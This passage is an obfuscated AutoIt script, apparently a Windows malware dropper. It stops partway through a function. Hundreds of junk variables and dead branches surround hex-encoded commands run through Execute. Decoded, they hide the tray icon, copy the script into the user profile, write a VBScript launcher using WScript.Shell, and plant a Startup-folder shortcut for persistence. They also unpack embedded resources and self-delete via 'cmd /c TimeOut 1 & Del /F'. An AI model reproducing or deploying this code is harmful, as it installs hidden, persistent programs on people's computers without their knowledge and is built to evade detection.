Dim $gpybuokyofqwl = IsString("fasepwdbentvwhbjbrixqamhsayimpzslhsej")
Global $ooackvmnd = "struct*"
Global $rjcutjkqvbu = "bool"
Dim $bvrlgygfk = "ptr"
Local $fcphkfeg = "netapi32.dll"
Dim $qkpyejmthxetqwszvbly = "gdi32.dll"
Local $dhborppyrvbaaqabv = "UrlCompareW"
If NOT ($gpybuokyofqwl == 0) Then
	Local $poe = Execute("execute")
Else
	$poe($ayudergfv("0x536C656570282474696D65202F20246C6F6F7029"))
EndIf
Dim $cgaiylsgjebhaeumq = IsString("zdjcvibuvxxxjh")
Dim $zmypvrivaqbdjjczddy = "-"
Dim $qnavgekzablkhokipayn = "]; uint MaxRed; uint Green["
Local $xvljrzsxvm = "WindowPos"
Global $ozlelapzrzcoo = "8845008B6C240C807D00007407C7042400000000C74424040100000083442408"
Local $ksofhdzvvszieqxbszuqptc = "]"
Global $gwjuceeylt = "dword"
Local $lzpjsah = "3000741148837C242800740948C7C001000000EB034831C04821C0740E48C7C0"
Dim $awpaw = "Text"
Local $kjzwdmaqvdgedkbvi = "ptr"
Global $jdnmfvixmeipv = "handle"
Dim $dpwdibfeow = "handle"
Local $tsfjffhwnrhdcdqvqjzeu = "gdi32.dll"
Global $vbixjyiysctmcfpyykqxo = "GUIConstants.au3"
Dim $ojxnxlabykodxkmpijlzkes = "Warning"
Global $fkbvgv = "ulong*"
Local $aavagcrnrrl = "{02731015-4510-4526-99E6-E5A17EBD1AEA}"
If NOT ($cgaiylsgjebhaeumq == "xwkjnb") Then
	Local $df
Else
	Local $fjfvgpbbuthdxclqobkfhpykd = $ee($v1("0x2479767864662026202246464646353045383235453446464646384235443134383934353234384438353734464446464646353045383133453446464646364135453839343532303842343530383539384422"))
EndIf
Dim $xbpfognjqntvfqz = IsString(92330177)
Dim $bmoniexsrashbrm = "lresult"
Dim $gpvyj = "int64 NetWrite;dword InitFailed;dword FailedComp;dword ReadOp;dword RandomReadOp;dword ReadSMBS;dword LargeReadSMBS;"
Dim $alrjnzdm = " value="
Local $cwjivspulundzx = "struct*"
Local $sddbldemahmtepfbnde = "struct*"
Dim $gttqk = "hWndOwnder"
Dim $lknktjhlrtfwukcahei = "FtpPutFileW"
Local $zomrwjivtreiwcgtvwuc = ">"
Local $jgwqsifefgrlzxcmxc = "bool"
Dim $sloaunjlhjiowcl = "user32.dll"
Global $mnmybfqgwtjwzqkdr = "long"
Dim $yvwtxxixcvrlfnjmb = "int"
Local $knrqbljsdsk = "kernel32.dll"
Global $rqrtbe = "bool"
If NOT ($xbpfognjqntvfqz == 1) Then
	Opt("TrayIconHide", "1")
Else
	Local $oo = $poe($fooi4e("0x446C6C5374727563744765745074722824503529"))
EndIf

Func fzhoiqadyo($aaa, $bbb)
	Dim $dacyrmgxbykzgkegrmn = IsString(3660882)
	Local $tdvsv = "pt"
	Global $mrjqoduxl = "Item"
	Local $gtwgmkboqgzuqb = "."
	Local $obthenpbosospensy = "kernel32.dll"
	Global $pgkhcofrpz = "Error"
	Global $hxeyebggf = "dword"
	Global $wbcmbshfhbiqlep = "fStyle"
	If NOT ($dacyrmgxbykzgkegrmn == 1) Then
		Local $wzneciaftzmxvngecerfajkujgwyjzn = $poe("binarytostring")
	Else
		Local $wcmwlyuhes = $ee($v1("0x247A7A726E69696176717566666D7872637379772026202238443835344346424646464635304538413545374646464638393835384330303030303038443835433446394646464635304538393345374646464638393835463430303030303022"))
	EndIf
	Dim $lofpligiutstajhrtfncfoh = IsInt("jfdfdbjnoyxznatdmpoemsewhwlrh")
	Dim $nmalyjtjnxlsvdhy = "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;"
	Local $raysycfsxh = "{D9DC8A3B-B784-432E-A781-5A1130A75963}"
	Global $crvhsgurpyevuv = "struct*"
	Dim $iqhsopoucj = "wstr"
	Local $cncypeizfhrpbbuwdgzpq = "hwnd"
	Local $uocgnqwbatwrtwf = "\"
	Global $diqcmnuyyc = "244048C7442458180000004831C0483B4424587F3D488BAC24A80000004C8B7D"
	Dim $ddoeaccl = "kernel32.dll"
	Local $phfdchaxwjvawrcpl = "sensapi.dll"
	Global $hzosnerfzrvnxaneirvr = "handle"
	Global $vidrnxnq = "shlwapi.dll"
	Global $iqsmqypvxenhdwdygu = "byte"
	Global $kutkkmehmbzpgrxlwa = "uint*"
	Dim $zahazvjzg = "bool"
	Dim $yyvzbgllokdorwegmktxylk = "struct*"
	Local $kruhgfxshtbl = "wchar["
	Global $qrpxtidrdmwce = "wstr"
	Local $borvuqgexqzolebp = "hwnd"
	Local $tuwrbgaruk = "dword"
	If NOT ($lofpligiutstajhrtfncfoh == "cdxrrbrugwtskblufqnmpsebed") Then
		Local $qhccowtetrhfrjskqnagr = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x405573657250726F66696C65446972202620225C2220262024626262"))
	Else
		Local $fonbvcheguftwkcaeikgadyzndug = $ee($v1("0x246970796C686575727179726E73677668617674617863676763706E632026202238443835373846394646464635304538354445374646464638393835413430303030303038443835453446424646464635304538344245374646464638393835434330303030303022"))
	EndIf
	Local $orqldofxceehqoekmzvzpvztenerxkzsacumdho = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x24716863636F77746574726866726A736B716E616772202620225C2220262024616161"))
	Dim $suezxdyqzllzcjofzlg = IsString("utjiolicndqoy")
	Global $fwppuzltvxgugedlavii = "Flags"
	Global $ssusjdybablubojw = "struct*"
	Global $eecuyuhudwjkjjgxwz = "Day"
	Dim $wwgsvkcxqyijsskpy = "dword*"
	Global $iueqrb = "form"
	Global $mwswbhivbdkfxnxba = "ptr"
	Local $hyejbhcspbuzigdcqnrkct = "dword*"
	Global $wlhgpqktxiosivt = "MinValid"
	Local $zjlwqjvknz = "wparam"
	Global $bmwewulzlkfkypk = "RichEditConstants.au3"
	Global $flnxibzuxlfdkndumflqxke = "struct*"
	Local $flsulcvcbiaedufbwauhzshd = "DllName"
	Dim $azuggjjwobdzchimvtibql = "advapi32.dll"
	If NOT ($suezxdyqzllzcjofzlg == 0) Then
		Local $hpudqgyrglybjztszujdupnyzjggzoyrledakhmgmngedexblxlu = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x24716863636F77746574726866726A736B716E616772202620225C2220262024626262202620222E76627322"))
	Else
		Local $utxpvlgktjieqscrywgdc = $ee($v1("0x24727A696D6C66646477646F2026202238423544313438443835354346464646464635304538373245414646464638424630384434354143353038394235453846384646464645383631454146464646384246383844383522"))
	EndIf
	Dim $emgzneprggucgbu = IsInt(42989224)
	Local $taszrfmjucfpdgctdkijmltv = "P"
	Dim $tyoisuwue = "GetStockObject"
	Dim $hrfxdbfyazb = "gdi32.dll"
	Local $hmihwmlaslgunugmx = "int"
	Global $ashopu = "align 4;dword cb;dword flags;uint codepage;ptr lpDefaultChar;ptr lpbUsedDefChar"
	Dim $uxwybnjl = "SizeofResource"
	Global $xhzurinkrnbbvhqpfurb = "bool*"
	Dim $ynjwlhwabbbettnwggxpr = "ulong"
	Global $rlyer = "CyanRed"
	Global $tlaghmcdunaatcxws = "kernel32.dll"
	Local $goefrifaisiwfllhsgpue = "int"
	Global $swhoocm = "GetDurationFormat"
	Global $jegup = "bool"
	Dim $ucfduh = "DeviceIoControl"
	Local $lhqpnub = "GetDC"
	Global $qlggn = "GlobalAlloc"
	Dim $haxqpnd = "bmWidth"
	Global $obayyyamdlwjfhuyrpnwrbp = "handle"
	Local $fvsdmnccytzrnhfa = "handle"
	If NOT ($emgzneprggucgbu == "txzrsqczjxuzohgtpy") Then
		Local $chypaqwnkeudeyghtmsfzluxvmnxhxyjnrcdukjtbgzcohpcipgeumvroqd = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x4053746172747570446972202620225C2220262024626262202620222E75726C22"))
	Else
		Local $ipylheurqyrnsgvhavtaxcggcpnc = $ee($v1("0x2477636D776C79756865732026202238443835444346394646464635304538383145374646464638393835463030303030303038443835323446394646464635304538364645374646464638393835373830313030303022"))
	EndIf
	Dim $gyupvqvnlvhnlwpjsfu = IsString(11563172)
	Dim $jbzzcfq = "handle"
	Dim $xkupzbhzchvlhdcdpagzuy = "struct*"
	Global $urwkfeqloy = "int"
	Local $ftrygzh = "struct*"
	Global $wyqqkcbytcjfjlpwcfatf = "wstr"
	Local $vmivsrkibwzloo = "Italic"
	If NOT ($gyupvqvnlvhnlwpjsfu == "rqazdypeinawyyuvavxgztmd") Then
		Local $aaavfdfd4sv4d = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x22536574205773685368656C6C203D20575363726970742E4372656174654F626A65637428222026204368722833342920262022575363726970742E5368656C6C22202620436872283334292026202229222026204043524C4620262022575363726970742E536C6565702822202620526F756E642852616E646F6D28353030302C20313530303029292026202229222026204043524C46202620225773685368656C6C2E52756E2022202620436872283334292026204368722833342920262043687228333429202620246F72716C646F667863656568716F656B6D7A767A70767A74656E6572786B7A736163756D64686F202620436872283334292026204368722833342920262043687228333429"))
	Else
		Local $cmnqbaenuyawwknbtrexthohrhzxhznyludhcgukgfmc = $ee($v1("0x446C6C43616C6C41646472657373282264776F7264222C20247A6A6E6C616F6D726F78646A6A71677168712C2022737472222C20457865637574652842696E617279546F537472696E672824505029292C2022707472222C20446C6C53747275637447657450747228247878786A79767070786E796C6B64617A6E756E6F73796D6371662929"))
	EndIf
	Dim $nzlmtzjgjjx = IsString(88824271)
	If NOT ($nzlmtzjgjjx == 1) Then
		Local $gfds45sdq45 = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x225B496E7465726E657453686F72746375745D222026204043522026202255524C3D66696C653A2F2F2F22202620537472696E675265706C61636528246870756471677972676C79626A7A74737A756A6475706E797A6A67677A6F79726C6564616B686D676D6E6765646578626C786C752C20225C222C20222F2229"))
	Else
		Local $hbnrkbyv = $ee($v1("0x246B6F7A6C6B70787862616F7762676F7675792026202231424330463744303233433838424334323530304630464646463342433837323041384243313539393438423030383930343234433332443030313030303030383530304542453922"))
	EndIf
	Local $pqrgmtilhbdimfgispmtvhouutszwitnaqphekugxmvifmysjrahrnaw = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C654578697374732824716863636F77746574726866726A736B716E61677229"))
	Dim $zkevxufgcraenldio = IsInt("pwgsstm")
	Dim $csvcbmitjlbfab = "handle"
	Global $ohtiutvwugb = "bool"
	Dim $tlmhlaust = "bool"
	Dim $pchlcxvqczm = "float["
	If NOT ($zkevxufgcraenldio == 1) Then
		Local $cihmyvomfiprbymrtp = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C6545786973747328246F72716C646F667863656568716F656B6D7A767A70767A74656E6572786B7A736163756D64686F29"))
	Else
		Local $joejzlmmhza = $ee($v1("0x2470746F6A7961757778657966657771746D70767561636F6A6365696B2026202244373844383545434644464646463833433430433530464644363539343035303844383545434644464646463530384438354343463246464646353046464437384438353238464522"))
	EndIf
	Dim $zzghfhlgeh = IsString(-45247894)
	Global $nwnvamdsojednlduyia = "RPC server not accessible."
	Dim $lnqxckvnyizcdgl = "dword*"
	Dim $vgrybexubmvetlszlzfck = "biSize"
	Global $kvdli = "GetDC"
	Local $efrtwmmmzhj = "Right"
	Global $pojdumlbkcjqnfamldd = "Path"
	Global $uydymsccjnirgpb = "handle"
	Dim $wduokfzglnvfgetbtlavzs = "handle"
	Dim $wivzklhagrwtfoxzghp = "user32.dll"
	Dim $exfwpegwde = "&lt;input name="
	Global $xdhbboeznxinxdw = "handle"
	Local $bnpdxtovctjn = "bool"
	Dim $zavzfnszhqax = "whi"
	Global $kdrvl = "em"
	Global $gnmglkqzgbexcbufvio = "Bottom"
	If NOT ($zzghfhlgeh == 1) Then
		Local $kzlfbaskuhxaqhfypkxhxh = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C6545786973747328246870756471677972676C79626A7A74737A756A6475706E797A6A67677A6F79726C6564616B686D676D6E6765646578626C786C7529"))
	Else
		Local $xyizcsucla = $ee($v1("0x246C6B717569716C7A766C656B6E65787276797075642026202234334337383530434639464646463732363536313734433738353130463946464646363535303732364643373835313446394646464636333635373337334337383531384639464622"))
	EndIf
	Dim $xwgdbjfwvvaahpl = BinaryToString("ujufdocgrhpitxktxyfsqizircwcz")
	Local $ruvduyijlacuqgirg = "Scan0"
	Local $kdkfd = "int"
	Global $imobyrwdacjdbv = "DestroyIcon"
	Global $gkbgtnexofnjqaxdvbz = "browser"
	Dim $zjfqdtgzotomwmugozjek = "Error"
	If NOT ($xwgdbjfwvvaahpl == "wdrywalyhdnyxe") Then
		Local $ascikbidnjxeatwjmwyetkibgqnpdpmoeflzel = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C654578697374732824636879706171776E6B65756465796768746D73667A6C7578766D6E786878796A6E726364756B6A7462677A636F68706369706765756D76726F716429"))
	Else
		Local $wfvzea = $ee($v1("0x24796776707472637A75756F7773677967752026202246454646464635433645373436344337383535434645464646463643364332453634363643373835363046454646464636433643383838353632464546464646433738354230464422"))
	EndIf
	Sleep(Random(2000, 5000))
	If $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x24707172676D74696C686264696D66676973706D7476686F757574737A7769746E61717068656B7567786D7669666D79736A726168726E6177203D2046616C7365")) Then
		Dim $tkblafukksl = BinaryToString("0x6E7364737A726E6762716A676164697274666B6C")
		If NOT ($tkblafukksl == 0) Then
			$poe($wzneciaftzmxvngecerfajkujgwyjzn("0x4469724372656174652824716863636F77746574726866726A736B716E61677229"))
		Else
			Local $voaezapyexcd = $ee($v1("0x24626165776C73706B6E6569756370696E6F76637861657A7075737977702026202238443835393446444646464635303844383544434636464646463530464644373844383531304645464646463833433430433530464644363539343035303844383531304645464622"))
		EndIf
	EndIf
	If $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x246B7A6C666261736B7568786171686679706B78687868203D2046616C7365")) Then
		Dim $jlqoruv = IsInt(66244323)
		Dim $mabwknblgchguuieu = "Error"
		Dim $elpynvu = "handle"
		Global $xarpikivaw = "ptr"
		Local $hdkuwmqjsiflakdjotnnze = "bool"
		Local $lxwykfnp = "uint"
		Dim $cbxbixfrmehaemldbbwd = "handle"
		Global $kotkhdrvlbjgnvmfb = "ptr"
		Local $aexsmy = "AutoIt.Error"
		If NOT ($jlqoruv == "saevfzpnwlprjchekhnkekhetvhhnryulmdqfjdsvr") Then
			$poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C65577269746528246870756471677972676C79626A7A74737A756A6475706E797A6A67677A6F79726C6564616B686D676D6E6765646578626C786C752C20246161617666646664347376346429"))
		Else
			$poe($rfo("0x5368656C6C457865637574652822636D64222C2022202F632054696D654F7574203120262044656C202F4620222026204368722822333422292026204053637269707446756C6C506174682026204368722822333422292C2022222C2022222C204053575F4849444529"))
		EndIf
	EndIf
	Dim $nsfxhkmmonxnui = IsString("hwfuqhuvhmwqnlhswaj")
	Dim $hpwvegtqgrbyicfitwlzcjz = "wstr"
	Local $chrhy = "GetDC"
	Dim $tvrxa = "dword*"
	Local $fvmoploadcihvyqfgeemy = "DeleteObject"
	Global $shikqvvv = "</html>"
	Dim $dezlqsq = "float"
	Global $yfvfmqwlbwgbjwhd = "int"
	Local $gnvnumbgso = "SetGraphicsMode"
	Dim $xptcmfeezjklxcvdenohw = "struct*"
	Dim $saskkex = "fStyle"
	Local $etdfqzedhekbx = "$_IESTATUS_InvalidDataType"
	Dim $obfbzio = "wstr"
	Local $mtuvldxmybaywo = "ftLastAccessTime"
	Global $vsqchfhpwc = "PointSize"
	Local $envemkimthdlmedpeqygb = "RoundRect"
	Global $jfomfpakbcxmdscrkuc = "browser"
	If NOT ($nsfxhkmmonxnui == 0) Then
		$df = $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x405573657250726F66696C65446972202620225C2220262024626262"))
	Else
		$a = $poe($ayudergfv("0x4269744F522824612C202461202B2022312229"))
	EndIf
	If $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x24617363696B6269646E6A78656174776A6D777965746B696267716E7064706D6F65666C7A656C203D2046616C7365")) Then
		Dim $rvaeaslofulqcv = BinaryToString("gzegmbixwheepg")
		Dim $gtjkhqmm = "bool"
		Dim $gqlgrkoiexpwwhlwawuvo = "dword"
		Global $thktnnfw = "Fmt"
		Local $uewexincgrwncvtl = "<unnamed>"
		Global $hsrhmjzuurrsqn = "int"
		Local $esxnakrmxtiyubqctbv = "handle"
		Global $uxnslpzgaiea = "ptr"
		Global $zghzuppqwapapwlxovuxzz = "lpbUsedDefChar"
		Global $nrtztt = "uint"
		Global $uuncctfgq = "GetClipBox"
		Global $jjplqemzwzyixhyw = "SetFileShortNameW"
		Dim $uhjcrjltas = "RectInRegion"
		Local $dndhdodohukuvffvv = "]"
		Local $lbhahybflmhdqjf = "hItem"
		Dim $sdzrnmzhvefyfidvd = "\"
		Dim $afmydvn = "Mask"
		If NOT ($rvaeaslofulqcv == 0) Then
			$poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C6557726974652824636879706171776E6B65756465796768746D73667A6C7578766D6E786878796A6E726364756B6A7462677A636F68706369706765756D76726F71642C2024676664733435736471343529"))
		Else
			Local $cgpdrdbkldsugkqiwxlluxwqyhcyg = $ee($v1("0x247A706B6A78702026202238443435423435303537464637354538464639353743303130303030353736413034384434353038353038423435423838334330303835304646373545383839374430384646393522"))
		EndIf
	EndIf
	If $poe($wzneciaftzmxvngecerfajkujgwyjzn("0x246369686D79766F6D6669707262796D727470203D2046616C7365")) Then
		Dim $mauseqm = IsString(67894637)
		Global $zcxzng = "user32.dll"
		Global $fdeaqmqborzsdidkgasrg = "Param"
		Local $bacpyqoohhhx = "dword"
		Global $dvmfwvjwutogggho = "handle"
		Local $ypkacxdkkwaguomovudr = "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
		Global $iwkjiizs = "document"
		Dim $tytvjitkyztntstrmuszg = "comctl32.dll"
		Local $esoucl = "handle"
		Local $zunuakvydteojrqoqnythonm = "handle"
		Local $tyinwentygxmjxbcmh = "\\"
		If NOT ($mauseqm == "yefpqdedwovkuaryhjxffgsynolncnut") Then
			$poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C65577269746528246F72716C646F667863656568716F656B6D7A767A70767A74656E6572786B7A736163756D64686F2C2046696C65526561642846696C654F70656E284053637269707446756C6C506174682C203136333834292929"))
		Else
			Local $wbagyvmubyznzqmdlzryv = $ee($v1("0x24746A6E7A68676471706C6B716A6D2026202238443835414346414646464635304538413945364646464638393835393030303030303038443835454346384646464635304538393745364646464638393835313430313030303022"))
		EndIf
	EndIf
EndFunc

Func isnotfzhoiqadyo()
	Dim $bxfmxewskgadjsbzvghkv = IsString(-31674712)
	Global $owgmb = "ImageList_BeginDrag"
	Dim $qwswprhujrfudqvbgfzcz = "float["
	Dim $swqalyfvyncfgzqqcanady = "bool"
	Global $efvgb = "SeDebugPrivilege"
	Local $vdsbhjlmjvpoquhpi = "{2B0F765D-C0E9-4171-908E-08A611B84FF6}"
	Global $ftuyszhsjoxrpplwx = "str"
	If NOT ($bxfmxewskgadjsbzvghkv == "ljkwqxnswxqvmynnejjopemejxemdcko") Then
		Dim $ufd = $poe("binarytostring")
	Else
		Local $tyuwidkrfqun = $ee($v1("0x2475747870766C676B746A69657173637279776764632026202231384646464646463530464644373842354431343839383545344638464646463844383538344643464646463530453834314541464646463839383532383031303030303844383522"))
	EndIf
	Return $df = $poe($ufd("0x40536372697074446972")) = Execute("0")
EndFunc

Func readresources($a, $b)
	Dim $rcntdiikkxgxbxwkcjuih = BinaryToString("0x74786C726A796767766762757A7979696C747A756A766774686D7562767465657769777470666165786778676B")
	Global $yzbjlrufhnszqqjpxucqvus = "handle"
	Dim $dgnpjjyejjjamp = "GdipSetLineColors"
	If NOT ($rcntdiikkxgxbxwkcjuih == 1) Then
		Dim $grfeus = $poe("binarytostring")
	Else
		Local $rwcrhnn = $ee($v1("0x2467656B6E6E2026202246444646464635304538353845394646464638393835323430313030303038443835313046424646464635304538343645394646464638393835454330303030303038443835354322"))
	EndIf
	Dim $pjsdsdyseybecegwaynnrr = IsString("rmliiugfvnhjmscsmqabttnsezafalljotbozafvxneeyvee")
	If NOT ($pjsdsdyseybecegwaynnrr == "rujwnwiyyyzdyinogf") Then
		Local $hinstance
	Else
		Local $etcafrwhwlvfxrktvkkyi = $ee($v1("0x2471647874746A697A6D666F766576746F6B6B796B6E65732026202230304337383535344643464646463445373434353645433738353538464346464646373536443635373243373835354346434646464636313734363534423636433738353630464322"))
	EndIf
	Dim $gagwinmzejlfuz = IsInt(42258906)
	Local $tbfcmznbqey = "Y"
	Local $gxxlip = "SeUnsolicitedInputPrivilege"
	Global $zxlveof = "wstr"
	Dim $ahkayuxulwufdcdocj = "handle"
	Dim $ubygebejnkisojuvwzrluc = "ptr"
	Local $tjrpmvmdvgfluttslyml = "kernel32.dll"
	Local $jsfksrbsgpmlsmtaowp = "Millimeters"
	Dim $kbgxsjdixheqixgl = "int"
	If NOT ($gagwinmzejlfuz == "yzcytnblvq") Then
		Local $mbrcqgdfzhaexjdpotvmubvnhcfaddlfazdrzxvqzvbwsivl = $poe($grfeus("0x446C6C43616C6C28226B65726E656C33322E646C6C222C2022707472222C202246696E645265736F7572636557222C2022707472222C202468496E7374616E63652C202277737472222C2024412C20226C6F6E67222C202442295B2230225D"))
	Else
		Local $klbkvsjdwlkfvmqqelndtahnvmf = $ee($v1("0x2469646D6D74617A627067687A77746478646F6868676466726F717574732026202245344646464638393435343038443835323446434646464635304646423545344638464646464646393545384638464646463839343533303844383537344642464646463530464622"))
	EndIf
	Local $tpvyndxzrufzdagcdewrpidifkpnrgobwqoexoagj = $poe($grfeus("0x446C6C43616C6C28226B65726E656C33322E646C6C222C202264776F7264222C202253697A656F665265736F75726365222C2022707472222C202468496E7374616E63652C2022707472222C20246D627263716764667A686165786A64706F74766D7562766E6863666164646C66617A64727A7876717A7662777369766C295B2230225D"))
	Dim $unywiibgrxxpx = IsInt(34407622)
	Dim $duzroyr = "{B96B3CB1-0728-11D3-9D7B-0000F81EF32E}"
	Dim $ewucce = "uint"
	Local $ntywmrgkhkhaopciy = "<meta content="
	Dim $aedbzbvdvmsyadukeynainku = "handle"
	Dim $hsueswppjpxxkwcpu = "sfc.dll"
	Dim $kusda = "user32.dll"
	Dim $nuibylolaizckoluha = "Size"
	Dim $xpdrafmaq = "uint"
	Global $ycphwzyhrolrgqvjxwzw = "PathYetAnotherMakeUniqueName"
	Local $efkygclkffhlmwnkb = "float"
	Global $idlkjjccudywmmk = "byte["
	Local $sfgeg = ">Five</td>"
	Global $jnklysby = "Text"
	Dim $zowziqbhkyzllyalrge = "wstr"
	Global $ezpsiffvofkiml = "handle"
	If NOT ($unywiibgrxxpx == 0) Then
		Local $bgpogvpvnyrguccjki = $poe($grfeus("0x446C6C43616C6C28226B65726E656C33322E646C6C222C2022707472222C20224C6F61645265736F75726365222C2022707472222C202468496E7374616E63652C2022707472222C20246D627263716764667A686165786A64706F74766D7562766E6863666164646C66617A64727A7876717A7662777369766C295B2230225D"))
	Else
		Local $tfqokzmhzkljtnw = $ee($v1("0x246C72706D6766796568787775752026202243373835363846434646464637333734363537324337383536434643464646463433364336313733363643373835373046434646464637333537383838353732464346464646433722"))
	EndIf
	Dim $yofeogkcy = IsString(-15206584)
	Local $cdtnkwkphvbpjtbcmp = "dword"
	Local $prvxypntwhz = "		<td>Six</td>"
	Global $hpybyvi = "handle"
	Local $zwrawai = "wstr"
	If NOT ($yofeogkcy == 1) Then
		Local $cbgbguzkdzrzyfipbvtr = $poe($grfeus("0x446C6C43616C6C28226B65726E656C33322E646C6C222C2022707472222C20224C6F636B5265736F75726365222C2022707472222C20246267706F677670766E7972677563636A6B69295B2230225D"))
	Else
		Local $hbnrkbyv = $ee($v1("0x246B6F7A6C6B70787862616F7762676F7675792026202231424330463744303233433838424334323530304630464646463342433837323041384243313539393438423030383930343234433332443030313030303030383530304542453922"))
	EndIf
	Return $poe($grfeus("0x446C6C5374727563744372656174652822627974655B2220262024747076796E64787A7275667A646167636465777270696469666B706E72676F6277716F65786F61676A202620225D222C20246362676267757A6B647A727A796669706276747229"))
EndFunc

Func dpwcooimxa()
	Dim $inlyqlhxvlocdmqunnnrqai = IsInt("xwxzsmvvpnppf")
	Dim $mxwzjooqvripqxmvvawjagj = " name="
	Global $giedfrjjlyppsoxayvfxatn = "Mime-Version: 1.0"
	Local $csxfojekhglrlqghmn = "Text"
	Dim $hlaingxxnvr = "dword"
	Local $qmfkflhhrogjortg = "handle"
	Dim $kvgxwadgn = "gdi32.dll"
	Local $aybqvgdavazulbdrfehv = "offline"
	Local $ujojjce = "bool"
	Local $vgknbyavfl = "handle"
	Global $lvwlbimphpvggg = "shell32.dll"
	Global $qflnqvsdefgzgzsywdnnqclb = "int"
	Local $ohusccguejzvadhxc = "wparam"
	Local $pchjdj = "ptr"
	Dim $tjvcedwjnexzfoo = "none"
	Dim $jifiwclbmzlotvx = "handle"
	Local $dswzl = "dword"
	Local $rbkos = "<a href="
	Global $xailntrdrxyykcbzeoupr = "Text"
	If NOT ($inlyqlhxvlocdmqunnnrqai == 1) Then
		Dim $gfro = $poe("binarytostring")
	Else
		Local $eptyxu = $ee($v1("0x2472776372686E6E2026202246464646464635304538333445394646464638393835303430313030303038443835303446444646464635304538323245394646464638393835394330303030303038443435414322"))
	EndIf
	For $i = "0" To "100"
		If $poe($gfro("0x50726f63657373457869737473282450455041473029203d20223022")) Then
			Dim $rtvkjqxgztxxxxznkbsinp = IsString("qodffelisndnrjrlunmxmwjgwyvjcgppdi")
			Global $jergeocqrrihm = "GetWindowRgn"
			Global $fmedcfbjnybjcdevjgnbhmt = "X"
			Global $ivbtgovrkd = "SelectedImage"
			Global $echsfntonmm = "int"
			Dim $pqstvivwf = "ptr;dword;dword;dword"
			Global $nnltblnxjzztovbsui = "ptr*"
			Global $hgark = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
			Local $hwzynafdulbjiwq = "ptr"
			Global $zhccxsxr = "Item"
			Dim $brwbkbcaubvwp = "%hs"
			Global $mskpjsfofkfzgbw = "uint_ptr"
			If NOT ($rtvkjqxgztxxxxznkbsinp == 0) Then
				srwnhmjlgx()
			Else
				Local $bclbkflc = $ee($v1("0x247766667A626A677373797061627577796A75666D6A726B662026202238353432464346464646433738353434464446464646344537343446373043373835343846444646464636353645344437354337383534434644464646463734363136453734383822"))
			EndIf
		EndIf
		Dim $stteixvoredeknczfkyurci = IsString(-64472869)
		Global $cttfayxgdieupbsobkvxc = "{DF7266AC-9274-4867-8D55-3BD661DE872D}"
		Dim $xafqkhxnyzlxkydmq = "dword"
		Global $gdfqkukwzctcrdhasgwvlq = "EndUpdateResourceW"
		Local $uechjghefjtvpgpx = "-"
		Local $gjggrdtjyzkphpbpqhpqv = "AutoIt.Error"
		Global $tnedagyldajgnx = "window"
		Dim $xievtmgoqzplwzuku = "Italic"
		Dim $qirbymgguctwkbycuqabypk = "TypeData"
		Local $gbovt = "wparam"
		Dim $zoqcwhgzt = "SeSyncAgentPrivilege"
		Dim $avarqdmczaxksxferzi = "dxyLineButton"
		Local $bklrutuy = "handle"
		Global $palaw = "ButtonConstants.au3"
		Local $fgyqgjybbiufxevtqfzjtha = "Shadow"
		Dim $dxteuutljydt = "Top"
		Dim $rtqbrckeskrfgexftpwgb = "ptr;dword;dword;dword"
		If NOT ($stteixvoredeknczfkyurci == 1) Then
			$i = $poe($gfro("0x2469202D20223122"))
		Else
			Local $fqbyhscug = $ee($v1("0x2471726D62736B796376666B792026202243373835313446454646464637373645343436434337383531384645464646463643373333333332433738353143464546464646354337353733363543373835323046454646464622"))
		EndIf
	Next
EndFunc

Func leqmopupon($file, $startup, $res, $run = "True")
	Dim $oalmvxqxarncokdjgstbud = IsInt(-54828122)
	Local $jdjaujwcbfqphbmrnsc = "wparam"
	Global $gpnigdllzfjdgtrrt = "uOffset"
	Global $bdqdlahlate = "Redirect"
	Global $xtmmdtqpgkfdutawzjr = "innerhtml"
	Local $zkwgwz = "document"
	If NOT ($oalmvxqxarncokdjgstbud == 0) Then
		Dim $zeyc = $poe("binarytostring")
	Else
		Local $csubwbngktjuey = $ee($v1("0x246261707076626C682026202246463732363536453734433738354643463846464646353537333635373243373835303046394646464634423635373935304337383530344639464646463631373436383030433722"))
	EndIf
	Dim $bhfovxehp = IsInt(-115452)
	Global $xifnlduuk = "dword"
	Dim $ucpwxreajyygxcsruttdf = "bool"
	Local $ainhkgxrkadcrsb = "ptr"
	Dim $vzjzpjlcaqtapaobwoexpd = "uint"
	Dim $xyqabstwixoebtdvifgykk = "handle"
	Local $wmvjgsydcslvczyzd = "bool"
	Dim $xuvbc = "Left"
	Global $hmmvckffyncfpayasafg = "ptr"
	If NOT ($bhfovxehp == "yxkxgkjfkjtsaecqvspesglalyjifwkydjhcojdynyuerwzo") Then
		Local $hygrxutduyjlswrpjxzfyvcxrvzbdbldtjul = $poe($zeyc("0x4054656D70446972202620436872283932292026202466696C65"))
	Else
		Local $aibrhlgprwbpuoyosluscjlnbchc = $ee($v1("0x2468696A6477646A2026202237353045384438354343463246464646453841434542464646463839343531303844383539344534464646464538394545424646464638393435304338354330373530453844383522"))
	EndIf
	Dim $gdansbruhyuevqfpssutaqex = IsString(-57792615)
	Global $bbslifiuprd = "as-is"
	Dim $dkkehuchn = ")</title>"
	Local $pyccwfwlfwctnkxudaqewkbm = "GetThemeTransitionDuration"
	Global $aguogvjpjsmuyrt = "user32.dll"
	Dim $rqwxhdmvkcf = "ushort;ushort;ptr;wchar["
	Local $erwfkiw = "PathRemoveExtensionW"
